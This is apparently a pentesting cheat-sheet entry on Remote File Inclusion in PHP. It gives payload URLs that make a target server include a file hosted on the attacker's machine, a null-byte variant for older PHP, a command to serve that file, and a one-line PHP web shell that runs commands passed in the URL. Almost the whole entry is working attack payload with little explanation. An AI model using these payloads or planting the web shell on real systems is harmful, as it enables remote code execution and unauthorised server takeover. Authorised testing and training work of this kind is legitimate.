# Remote File Inclusion (RFI)

```php
# Test (host a PHP file on your machine)
http://$TARGET_IP/index.php?page=http://$ATTACK_IP/shell.txt

# With null byte injection (older PHP)
http://$TARGET_IP/index.php?page=http://$ATTACK_IP/shell.txt%00
```

Host a file on your machine:
```bash
python3 -m http.server 80
# Create shell.txt with: <?php system($_GET['cmd']); ?>
```
